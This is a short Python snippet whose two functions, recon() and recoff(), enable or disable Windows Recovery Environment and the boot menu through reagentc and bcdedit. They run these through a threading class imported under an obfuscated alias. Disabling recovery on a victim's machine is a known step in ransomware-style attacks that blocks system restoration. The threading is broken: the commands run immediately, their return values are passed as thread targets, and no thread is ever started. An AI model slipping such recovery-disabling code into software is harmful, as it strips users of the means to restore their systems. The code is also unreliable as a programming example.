import os
from threading import Thread as FGUIRFUIFR
def recon():
    FGUIRFUIFR(target=os.system('reagentc /enable'))
    FGUIRFUIFR(target=os.system('bcdedit /set {default} recoveryenabled Yes'))
    FGUIRFUIFR(target=os.system('bcdedit /set {bootmgr} displaybootmenu Yes'))
def recoff():
    FGUIRFUIFR(target=os.system('reagentc /disable'))
    FGUIRFUIFR(target=os.system('bcdedit /set {default} recoveryenabled No'))
    FGUIRFUIFR(target=os.system('bcdedit /set {bootmgr} displaybootmenu No'))    